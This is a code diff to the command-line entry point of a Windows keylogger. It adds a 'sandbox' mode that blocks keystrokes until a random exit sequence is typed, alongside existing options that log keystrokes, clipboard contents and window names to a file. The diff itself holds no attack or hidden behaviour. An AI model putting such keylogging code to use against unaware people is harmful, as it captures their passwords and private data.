@@ -2,30 +2,38 @@
 #include "FileLogger.h"
 #include "KeycodeMapperUS.h"
 #include "KeystrokeCapturerWindows.h"
+#include "SandboxListener.h"
 #include "WindowHandlerWindows.h"
 
 #include "getopt.h"
 
 #include <iostream>
+#include <thread>
 #include <windows.h>
 
 Keylogger::IKeycodeMapper* getMapperByStr(std::string mapper) {
     if (mapper == "us") {
         return new Keylogger::KeycodeMapperUS();
-    } else {
-        return nullptr;
+    }
+    return nullptr;
+}
+
+void printSandboxState(Keylogger::SandboxListener* sandbox) {
+    while (true) {
+        std::cout << "Type '" << sandbox->getExitSeq(true) << "' to exit the sandbox." << std::endl;
+        Sleep(500);
     }
 }
 
 int main(int argc, char *argv[]) {
-    const char* const short_opts = "chkm:o:s::w";
+    const char* const short_opts = "chkm:o:sw";
     const option long_opts[] = {
         {"clipboard", no_argument, nullptr, 'c'},
         {"help", no_argument, nullptr, 'h'},
         {"keycodes", no_argument, nullptr, 'k'},
         {"mapper", required_argument, nullptr, 'm'},
         {"output", required_argument, nullptr, 'o'},
-        {"sandbox", optional_argument, nullptr, 's'},
+        {"sandbox", no_argument, nullptr, 's'},
         {"window", no_argument, nullptr, 'w'},
         {nullptr, no_argument, nullptr, 0}
     };
@@ -37,12 +45,15 @@ options:\n\
   -k, --keycodes         log keycodes pressed/released\n\
   -m, --mapper [name]    use this keycode mapper (default 'us')\n\
   -o, --output [file]    output to this file\n\
-  -s, --sandbox [seq]    capture key presses without passing them through\n\
+  -s, --sandbox          capture key presses without passing them through\n\
+                           until the correct sequence is typed, then exit\n\
   -w, --window           enable window name logging\n\
 \n\
 available keycode maps:\n\
   us    US keyboard\n\
 ";
+
+    srand(time(0));
 
     Keylogger::IKeycodeMapper* mapper = new Keylogger::KeycodeMapperUS();
     std::string logName = "log";
@@ -50,6 +61,7 @@ available keycode maps:\n\
     bool clipboardEnable = false;
     bool keycodesLog = false;
     bool windowEnable = false;
+    bool sandbox = false;
 
     int opt;
     while ((opt = getopt_long(argc, argv, short_opts, long_opts, nullptr)) != -1) {
@@ -64,12 +76,16 @@ available keycode maps:\n\
             delete mapper;
             mapper = getMapperByStr(optarg);
             if (mapper == nullptr) {
+                std::cout << "error: unknown keycode map." << std::endl << std::endl;
                 std::cout << help;
                 return 1;
             }
             break;
         case 'o':
             logName = std::string(optarg);
+            break;
+        case 's':
+            sandbox = true;
             break;
         case 'w':
             windowEnable = true;
@@ -109,7 +125,22 @@ available keycode maps:\n\
     capturer.addLogger(&logger);
 
     capturer.start();
-    capturer.consumeKeystrokes(false);
+    capturer.consumeKeystrokes(sandbox);
+
+    Keylogger::SandboxListener sandboxListener;
+    std::thread* thr;
+
+    if (sandbox) {
+        sandboxListener.start(mapper);
+        thr = new std::thread(printSandboxState, &sandboxListener);
+        capturer.setCallback([&sandboxListener](int keycode, Keylogger::KeyState state) {
+            if (state == Keylogger::KeyState::Pressed) {
+                if (sandboxListener.keycodeSent(keycode)) {
+                    exit(0);
+                }
+            }
+        });
+    }
 
     MSG msg;
     while (!GetMessage(&msg, NULL, NULL, NULL)) {
